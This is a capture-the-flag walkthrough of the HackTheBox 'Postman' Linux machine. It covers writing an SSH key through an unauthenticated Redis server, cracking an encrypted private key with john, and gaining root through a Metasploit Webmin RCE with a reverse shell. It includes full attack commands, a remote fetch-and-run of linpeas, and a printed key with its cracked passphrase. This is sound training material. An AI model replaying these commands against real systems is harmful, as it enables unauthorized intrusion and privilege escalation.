---
layout: ctf
title: "HackTheBox: Postman"
platform: "HackTheBox"
type: "Machine"
difficulty: "Easy"
image: "/assets/img/ctf/postman.png"
tags: [Linux, Redis, John, Webmin]
date: 2026-05-12
---

# 🎯 Postman

**OS:** Linux | **Difficulty:** Easy | **IP:** `10.129.2.1`

![postman.htb](/assets/img/ctf/data/postman-htb.png)

---

## ⛓️ TL;DR / Attack Chain
1. **Foothold:** Open Redis server with no authentication allowing users to write ssh keys to `/var/lib/redis/.ssh` allowing to authenticate via ssh.
2. **PrivEsc (Matt):** Found Matt's ssh private key in `/opt` encrypted. Cracked with `john`, found password: `computer2008`.
3. **PrivEsc (Root):** Logged into `Webmin` (:10000) with `Matt`:`computer2008` and executed `linux/http/webmin_packageup_rce` in `msfconsole` giving us a root shell.

---

## 🔑 Loot & Creds

| User | Credential | Where / How |
| :--- | :--- | :--- |
| `Matt` | `computer2008` | Cracked encrypted `id_rsa.bak` found in `/opt` |

---

## 🔧 0. Setup & Global Variables
*Run this in your terminal once so you can copy-paste the rest of the commands blindly.*

```bash
$ IP="10.129.2.1" ; DOMAIN="postman.htb" && \
  echo "$IP $DOMAIN" | sudo tee -a /etc/hosts
```

---

## 🔍 1. Enumeration

### Nmap
```bash
$ mkdir -p nmap && nmap -sV -sC -p- $IP -oA ./nmap/nmap
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 14:56 +0200
Nmap scan report for postman.htb (10.129.2.1)
Host is up (0.028s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.09 seconds
```

### HTTP/80

![postman-1](/assets/img/ctf/data/postman-1.png)

Directory fuzzing:
```bash
$ mkdir -p ffuf && ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$DOMAIN/FUZZ -fs 3844 | tee ./ffuf/dir.scan

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://postman.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3844
________________________________________________

images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 36ms]
upload                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 26ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 25ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 26ms]
fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 27ms]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 31ms]

:: Progress: [220560/220560] :: Job [1/1] :: 769 req/sec :: Duration: [0:02:32] :: Errors: 0 ::
```

`/upload` has just a bunch of images:
![postman-2](/assets/img/ctf/data/postman-2.png)

vhosts fuzzing:
```bash
$ mkdir -p ffuf && ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://$DOMAIN/ -H "Host: FUZZ.$DOMAIN" -fs 3844 | tee ./ffuf/vhosts.scan

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://postman.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.postman.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3844
________________________________________________

:: Progress: [114442/114442] :: Job [1/1] :: 769 req/sec :: Duration: [0:01:22] :: Errors: 0 ::
```

### HTTP/10000

![postman-3](/assets/img/ctf/data/postman-3.png)

Trying login with `admin`:`admin`, `'`:`anything`, `tcg`:`tcg` but nothing working:
![postman-4](/assets/img/ctf/data/postman-4.png)

tried exactly three logins until we were blocked by the system:
![postman-5](/assets/img/ctf/data/postman-5.png)

Directory fuzzing:
```bash
$ mkdir -p ffuf && ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$DOMAIN:10000/FUZZ -fs 172 | tee ./ffuf/dir_10000.scan

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://postman.htb:10000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 172
________________________________________________

:: Progress: [11073/220560] :: Job [1/1] :: 86 req/sec :: Duration: [0:03:57] :: Errors: 160 ::
```

vhosts fuzzing:
```bash
$ mkdir -p ffuf && ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://$DOMAIN:10000/ -H "Host: FUZZ.$DOMAIN:10000" -fs 172 | tee ./ffuf/vhosts_10000.scan

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://postman.htb:10000/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.postman.htb:10000
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 172
________________________________________________

:: Progress: [12157/114442] :: Job [1/1] :: 86 req/sec :: Duration: [0:03:56] :: Errors: 160 ::
```

The errors actually were triggered when we were blocked by the server for having the wrong credentials for three times.

### HTTP/6379

```bash
$ nmap --script redis-info,redis-brute,vuln -sV -p 6379 $IP -oA ./nmap/nmap_redis
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 15:12 +0200
Nmap scan report for postman.htb (10.129.2.1)
Host is up (0.026s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits)
| redis-info:
|   Version: 4.0.9
|   Operating System: Linux 4.15.0-58-generic x86_64
|   Architecture: 64 bits
|   Process ID: 653
|   Used CPU (sys): 1.01
|   Used CPU (user): 0.33
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 821.70K
|   Role: master
|   Bind addresses:
|     0.0.0.0
|     ::1
|   Client connections:
|_    10.10.14.219
| vulners:
|   cpe:/a:redislabs:redis:4.0.9:
|     	CVE-2018-11219	9.8	https://vulners.com/cve/CVE-2018-11219
|     	CVE-2018-11218	9.8	https://vulners.com/cve/CVE-2018-11218
|     	CVE-2021-21309	8.8	https://vulners.com/cve/CVE-2021-21309
|     	EDB-ID:44904	8.4	https://vulners.com/exploitdb/EDB-ID:44904	*EXPLOIT*
|     	CVE-2018-12326	8.4	https://vulners.com/cve/CVE-2018-12326
|     	CVE-2020-14147	7.7	https://vulners.com/cve/CVE-2020-14147
|     	EDB-ID:44908	7.5	https://vulners.com/exploitdb/EDB-ID:44908	*EXPLOIT*
|     	CVE-2021-32761	7.5	https://vulners.com/cve/CVE-2021-32761
|     	CVE-2018-12453	7.5	https://vulners.com/cve/CVE-2018-12453
|     	CVE-2019-10193	7.2	https://vulners.com/cve/CVE-2019-10193
|     	CVE-2019-10192	7.2	https://vulners.com/cve/CVE-2019-10192
|     	CVE-2021-3470	5.3	https://vulners.com/cve/CVE-2021-3470
|     	EXPLOITPACK:67A9C59CE90430ACE23C1808DE8F7BD2	5.0	https://vulners.com/exploitpack/EXPLOITPACK:67A9C59CE90430ACE23C1808DE8F7BD2	*EXPLOIT*
|     	EXPLOITPACK:9F45D8CAB6F6E66F98E43562AEAB5DE2	4.6	https://vulners.com/exploitpack/EXPLOITPACK:9F45D8CAB6F6E66F98E43562AEAB5DE2	*EXPLOIT*
|     	PACKETSTORM:148270	0.0	https://vulners.com/packetstorm/PACKETSTORM:148270	*EXPLOIT*
|     	PACKETSTORM:148225	0.0	https://vulners.com/packetstorm/PACKETSTORM:148225	*EXPLOIT*
|     	1337DAY-ID-30603	0.0	https://vulners.com/zdt/1337DAY-ID-30603	*EXPLOIT*
|_    	1337DAY-ID-30598	0.0	https://vulners.com/zdt/1337DAY-ID-30598	*EXPLOIT*

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.79 seconds
```

We gotta enumerate manually then:

```bash
$ nc postman.htb 6379
info
$2725
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-58-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:653
run_id:0879a880e8569aedc856562571f4dba593486290
tcp_port:6379
uptime_in_seconds:1860
uptime_in_days:0
hz:10
lru_clock:207388
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:841360
used_memory_human:821.64K
used_memory_rss:2580480
used_memory_rss_human:2.46M
used_memory_peak:862296
used_memory_peak_human:842.09K
used_memory_peak_perc:97.57%
used_memory_overhead:832086
used_memory_startup:782456
used_memory_dataset:9274
used_memory_dataset_perc:15.74%
total_system_memory:941203456
total_system_memory_human:897.60M
used_memory_lua:41984
used_memory_lua_human:41.00K
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
mem_fragmentation_ratio:3.07
mem_allocator:jemalloc-3.6.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1778590424
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:9
total_commands_processed:31
instantaneous_ops_per_sec:0
total_net_input_bytes:835
total_net_output_bytes:39005
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:3d0bebf0089637821bc72c364376b9837eb8b7f5
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:1.63
used_cpu_user:0.54
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Cluster
cluster_enabled:0

# Keyspace
```

---

## 🚪 2. Initial Foothold

In the `redis`-netcat connection, I tried the following:
```bash
CONFIG SET dir /var/lib/redis/.ssh
+OK

CONFIG SET dbfilename authorized_keys
+OK

CONFIG SET dir /root/.ssh
-ERR Changing directory: Permission denied

config get dir
*2
$3
dir
$19
/var/lib/redis/.ssh

config get dbfilename
*2
$10
dbfilename
$15
authorized_keys

SET crack "\n\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFKsKkyQkLwlH3Gh1Q1nSd5NKcJzg39oeW/D7S+L84Wu tralsesec@omarchy\n\n\n"
+OK

SAVE
+OK

get crack
$104



ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFKsKkyQkLwlH3Gh1Q1nSd5NKcJzg39oeW/D7S+L84Wu tralsesec@omarchy





```

Then authenticated using ssh:
```bash
$ ssh -i ~/.ssh/id_ed25519 redis@postman.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key '/home/tralsesec/.ssh/id_ed25519':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ 
```

The vulnerability here is that redis:
1. Has no authentication
2. Allows users to use the `CONFIG` commands

We abused both and were allowed to write our own ssh public key into `/var/lib/redis/.ssh`.

---

## 📈 3.1 Privilege Escalation (`redis` -> `Matt`)

Upload `linpeas.sh` and let it enumerate:
```bash
redis@Postman:~$ wget http://10.10.14.219:1101/linpeas.sh
--2026-05-12 14:35:42--  http://10.10.14.219:1101/linpeas.sh
Connecting to 10.10.14.219:1101... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1031313 (1007K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                     100%[==================================================>]   1007K  2.16MB/s    in 0.5s

2026-05-12 14:35:42 (2.16 MB/s) - ‘linpeas.sh’ saved [1031313/1031313]

redis@Postman:~$ chmod +x ./linpeas.sh
redis@Postman:~$ ./linpeas.sh | tee lin.out

<SNIP>

══╣ Kernel modules loadable?  (T1547.006)
Modules can be loaded
══╣ Module signature enforcement?  (T1547.006)
Not enforced

╔══════════╣ Kernel Exploit Registry (T1068)
═╣ Operating system ............. Linux
═╣ Kernel release ............... 4.15.0-58-generic
═╣ Comparable version ........... 4.15.0.58
═╣ Data chunk limit ............. max 25 rows per KERNEL_CVE_DATA_* variable (1..21)
═╣ Kernel config source ......... /boot/config-4.15.0-58-generic
CVE: CVE-2019-15666 | Name: XFRM_UAF | Match data: pkg=linux-kernel,ver>=3,ver<5.0.19,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,CONFIG_XFRM=y | Tags: 1 | Rank: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled
CVE: CVE-2021-3493 | Name: Ubuntu OverlayFS | Match data: pkg=linux-kernel,ver>=3.13,ver<5.14,x86_64 | Tags: ubuntu=(14.04|16.04|18.04|20.04|20.10) | Rank: 1 | Details: Only Ubuntu is affected.
CVE: CVE-2021-22555 | Name: Netfilter heap out-of-bounds write | Match data: pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6 | Tags: ubuntu=20.04{kernel:5.8.0-*} | Rank: 1 | Details: ip_tables kernel module must be loaded
CVE: CVE-2022-32250 | Name: nft_object UAF (NFT_MSG_NEWSET) | Match data: pkg=linux-kernel,ver<5.18.1,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} | Rank: 1 | Details: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
═╣ Kernel vulns found: 4

<SNIP>
```

Parallel, doing some manual enumeration, I found this:
```bash
redis@Postman:~$ find / -name "*id_rsa*" 2>/dev/null
/opt/id_rsa.bak
redis@Postman:~$ cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

Probably `Matt`'s private key. But it's encrypted:
```bash
redis@Postman:~$ ssh -i /opt/id_rsa.bak Matt@localhost
The authenticity of host 'localhost (::1)' can't be established.
ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Enter passphrase for key '/opt/id_rsa.bak':
```

We have to crack it with `john`:
```bash
$ cat << EOF > matt_id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
EOF
```

Now we use `ssh2john` in order to create a crackable hash out of the ssh private key so john can handle it easily:
```bash
$ ssh2john ./matt_id_rsa.bak > hash_for_john && \
  john --wordlist=/usr/share/wordlists/rockyou.txt hash_for_john
  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (./matt_id_rsa.bak)
1g 0:00:00:00 DONE (2026-05-12 15:44) 10.00g/s 2468Kp/s 2468Kc/s 2468KC/s confused6..colin22
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

There it is: `computer2008`
```bash
$ chmod 600 ./matt_id_rsa.bak && ssh -i ./matt_id_rsa.bak Matt@postman.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key './matt_id_rsa.bak':
Connection closed by 10.129.2.1 port 22
```

So the password was correct but somehow we can't connect. But trying locally to `su` to Matt worked with that password:
```bash
redis@Postman:~$ su Matt
Password:<computer2008>
Matt@Postman:/var/lib/redis$ cd ~
Matt@Postman:~$ cat user.txt
[REDACTED]
```

Here we go!

---

## 📈 3.2 Privilege Escalation (`Matt` -> `root`)

Now upload linpeas again and enumerate the system:
```bash
Matt@Postman:~$ wget http://10.10.14.219:1101/linpeas.sh
--2026-05-12 14:48:14--  http://10.10.14.219:1101/linpeas.sh
Connecting to 10.10.14.219:1101... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1031313 (1007K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                     100%[==================================================>]   1007K  2.14MB/s    in 0.5s

2026-05-12 14:48:14 (2.14 MB/s) - ‘linpeas.sh’ saved [1031313/1031313]

Matt@Postman:~$ chmod +x ./linpeas.sh
Matt@Postman:~$ ./linpeas.sh | tee ./lin.out

<SNIP>

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
```

For some reason `linpeas` doesn't go further and keeps stuck. Maybe that's intended by the box creator for us to enumerate manually. Let's do it then.

```bash
Matt@Postman:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/bin/fusermount
/bin/umount
/bin/su
/bin/ping
/bin/mount
```

After deep enumeration, we found nothing. But I remembered that there's the `Webmin` page on port `10000`, maybe the credentials work there too:
![postman-6](/assets/img/ctf/data/postman-6.png)

Indeed. `Matt`:`computer2008` works on the page.

Searching for the version online I saw this:
![postman-7](/assets/img/ctf/data/postman-7.png)

Let's try it:
```bash
$ msfconsole -x "reload_all; use linux/http/webmin_packageup_rce; set PASSWORD computer2008; set RHOSTS 10.129.2.1; set RPORT 10000; set SSL true; set USERNAME Matt; set LHOST tun0; exploit"

<SNIP>

[*] Using configured payload cmd/unix/reverse_perl
PASSWORD => computer2008
RHOSTS => 10.129.2.1
RPORT => 10000
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
USERNAME => Matt
LHOST => tun0
[*] Started reverse TCP handler on 10.10.14.219:4444
[+] Session cookie: 1ab0a1c169fd425ac6e7e2f2712cc51e
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.219:4444 -> 10.129.2.1:42174) at 2026-05-12 16:01:58 +0200

whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
[REDACTED]
```

Here we go!

![postman-8](/assets/img/ctf/data/postman-8.png)

---

## 🧠 Retrospective

* **Learnings:**
    1. Manual enumeration is king.
    2. Whenever you find credentials, reuse them everywhere (Matt's SSH password in Webmin).
    3. Always take a deep look at services that should be password protected but aren't.
